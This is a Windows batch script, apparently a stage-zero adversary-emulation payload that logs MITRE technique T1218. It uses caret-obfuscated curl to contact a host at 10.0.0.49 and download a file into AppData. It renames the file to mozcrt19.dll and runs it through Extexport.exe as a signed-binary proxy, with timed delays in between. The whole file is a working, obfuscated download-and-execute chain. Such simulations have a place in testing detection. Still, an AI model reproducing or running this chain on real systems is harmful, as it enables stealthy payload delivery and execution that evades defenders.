@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET yktnwwf=%APPDATA%\7856\a76fdb19
SET fpakbq=Macula-Stage0-7856
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?7856-10
SET omxgazu=BALAM-S2BO
SET yydue=10
SET edjwtl=exploren.txt
SET fpldhe=7856

REM Derived variables
SET hjklb=%APPDATA%\!yydue!
SET mnbvx=!hjklb!\macula-simulations.log

REM Initial delay 30-60s
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: delay_start=30s>>> "!mnbvx!" 2>nul
timeout /t 30 /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: delay_complete>>> "!mnbvx!" 2>nul

REM Step 1: Heartbeat check
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: heartbeat_start=!repbmqg!/!rdzgrnne!>>> "!mnbvx!" 2>nul
SET c^1=c^u
SET c2=^r^l
SET f^l1=-^k -^s
SET fl2=-^o n^u^l
!c1!!c2! !f^l1! !fl2! "!repbmqg!/!rdzgrnne!"
IF !ERRORLEVEL! NEQ 0 (
    SET ttp_result=0
    SET err_detail=connection_failed
    SET "logtimestamp=!DATE! !TIME!"
    echo [!logtimestamp!][!omxgazu!]: !yydue!-!fpldhe!-T1218|Signed Binary Proxy Execution=!ttp_result!:!err_detail!>> "!mnbvx!" 2>nul
    exit /b
)
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: heartbeat_complete>>> "!mnbvx!" 2>nul

REM Delay 5-15s
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: delay_start=10s>>> "!mnbvx!" 2>nul
ping -n 10 127.0.0.1 >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: delay_complete>>> "!mnbvx!" 2>nul

REM Ensure output directory exists
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: mkdir_start=!yktnwwf!>>> "!mnbvx!" 2>nul
IF NOT EXIST "!yktnwwf!" mkdir "!yktnwwf!" >nul 2>&1
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: mkdir_complete>>> "!mnbvx!" 2>nul

REM Download file with obfuscated curl
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: download_start=!repbmqg!/!edjwtl!>>> "!mnbvx!" 2>nul
SET d^l1=!repbmqg!/!edjwtl!
SET d^l2= -^o "!yktnwwf!\!edjwtl!"
!c1!!c2! !f^l1! !dl1!!dl2!
IF !ERRORLEVEL! NEQ 0 (
    SET ttp_result=0
    SET err_detail=download_failed
    SET "logtimestamp=!DATE! !TIME!"
    echo [!logtimestamp!][!omxgazu!]: !yydue!-!fpldhe!-T1218|Signed Binary Proxy Execution=!ttp_result!:!err_detail!>> "!mnbvx!" 2>nul
    exit /b
)
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: download_complete>>> "!mnbvx!" 2>nul

REM Random delay
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: random_delay_start>>> "!mnbvx!" 2>nul
SET /A r^nd=!RANDOM! %% 20 + 10
timeout /t !r^nd! /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: random_delay_complete=!r^nd!s>>> "!mnbvx!" 2>nul

REM Rename file
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: rename_start=!edjwtl!→mozcrt19.dll>>> "!mnbvx!" 2>nul
IF EXIST "!yktnwwf!\!edjwtl!" (
    ren "!yktnwwf!\!edjwtl!" mozcrt19.dll >nul 2>&1
    IF !ERRORLEVEL! NEQ 0 (
        SET ttp_result=0
        SET err_detail=rename_failed
        SET "logtimestamp=!DATE! !TIME!"
        echo [!logtimestamp!][!omxgazu!]: !yydue!-!fpldhe!-T1218|Signed Binary Proxy Execution=!ttp_result!:!err_detail!>> "!mnbvx!" 2>nul
        exit /b
    )
)
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: rename_complete>>> "!mnbvx!" 2>nul

REM Delay 5-15s
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: delay_start=8s>>> "!mnbvx!" 2>nul
CHOICE /C Y /N /D Y /T 8 >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: delay_complete>>> "!mnbvx!" 2>nul

REM Execute with obfuscated LOLBIN
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: execution_start=Extexport.exe>>> "!mnbvx!" 2>nul
SET e^1=E^x
SET e2=^t^e^x
SET e3=p^o^r^t
SET f^u1=!yktnwwf! f
SET fu2=oo b
SET fu3=ar
IF EXIST "!yktnwwf!\mozcrt19.dll" (
    "!e1!!e2!!e3!.exe" !f^u1!!fu2!!fu3!
    IF !ERRORLEVEL! EQU 0 (
        SET ttp_result=1
        SET err_detail=
    ) ELSE (
        SET ttp_result=0
        SET err_detail=execution_failed
    )
) ELSE (
    SET ttp_result=0
    SET err_detail=file_not_found
)
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: execution_complete>>> "!mnbvx!" 2>nul

REM TTP logging
SET "logtimestamp=!DATE! !TIME!"
echo [!logtimestamp!][!omxgazu!]: !yydue!-!fpldhe!-T1218|Signed Binary Proxy Execution=!ttp_result!:!err_detail!>> "!mnbvx!" 2>nul

REM Final delay
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: final_delay_start=15s>>> "!mnbvx!" 2>nul
timeout /t 15 /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: final_delay_complete>>> "!mnbvx!" 2>nul